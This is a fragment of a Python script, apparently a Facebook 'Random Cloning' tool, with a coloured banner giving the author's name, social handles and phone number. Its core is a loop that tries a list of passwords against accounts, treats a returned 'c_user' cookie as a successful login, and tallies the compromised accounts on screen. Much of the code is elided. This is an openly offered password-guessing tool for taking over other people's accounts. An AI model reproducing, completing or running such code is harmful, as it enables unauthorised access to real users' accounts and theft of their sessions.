...
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38mATIK-Hasan\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> Md Atikur Islam       ║  \033[1;97m
╠══[Github:=======================> \33[1;38mMr- Atik      ║\33[1;34m
╠══[Whatsapp:=====================> 01608843956     ║\33[1;35m
╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
╠══[VERSION:======================> 1.0.111.8         ║\033[1;35m
\033[0;92m╚═══════════════════════════════════════════════════╝\033[1;31m
    """) 
loop = 0
oks = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}ATIK {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
